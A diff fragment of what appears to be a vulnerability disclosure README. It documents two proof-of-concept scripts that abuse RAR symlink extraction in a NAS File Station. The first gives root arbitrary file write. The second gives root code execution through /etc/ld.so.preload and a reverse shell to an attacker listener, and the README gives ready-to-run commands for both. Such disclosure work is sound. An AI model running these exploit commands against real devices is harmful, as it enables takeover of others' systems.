@@ -50,13 +50,13 @@ UnixSymlink(target, LinkName);                        /* creates the link to the
 
 Two scripts: Both run on the attacker's side with a normal user's credentials, they build the RAR in memory, log in, and upload it to `--dest` (a folder an administrator can browse). The trigger is an administrator extracting that archive in File Station. In the examples below `/share` is a File Station folder the normal account can write.
 
-- **1-click normal-user-auth arbitrary file write**: `poc_arb_file_write.py`. Plants the archive; when an administrator extracts it, `--target` is written as root. WARNING: the extraction re-owns the target's **parent** directory (e.g. `/etc`) to the extracting administrator, which can break system commands; restore it with `chown root:root /etc; chmod 0755 /etc`. Example:
+- **1-click normal-user-auth arbitrary file write**: [`poc_arb_file_write.py`](poc_arb_file_write.py). Plants the archive; when an administrator extracts it, `--target` is written as root. WARNING: the extraction re-owns the target's **parent** directory (e.g. `/etc`) to the extracting administrator, which can break system commands; restore it with `chown root:root /etc; chmod 0755 /etc`. Example:
 
 ```
 python3 poc_arb_file_write.py --url https://nas:5001 --user alice --password 'Passw0rd!' --dest /share --file ./hello.txt --target /etc/hello.txt
 ```
 
-- **1-click normal-user-auth RCE**: `poc_rce.py`. Plants a RAR that drops `/etc/ld.so.preload` and a tiny `.so` (built locally with `gcc`), then listens and nudges `/webman/login.cgi` so that once an administrator extracts the archive, the next root `execve` loads the library and connects back a root shell. On connect it removes `/etc/ld.so.preload` and restores `/etc` ownership. Example:
+- **1-click normal-user-auth RCE**: [`poc_rce.py`](./poc_rce.py). Plants a RAR that drops `/etc/ld.so.preload` and a tiny `.so` (built locally with `gcc`), then listens and nudges `/webman/login.cgi` so that once an administrator extracts the archive, the next root `execve` loads the library and connects back a root shell. On connect it removes `/etc/ld.so.preload` and restores `/etc` ownership. Example:
 
 ```
 python3 poc_rce.py --url https://nas:5001 --user alice --password 'Passw0rd!' --dest /share --lhost 192.168.1.100 --lport 4444
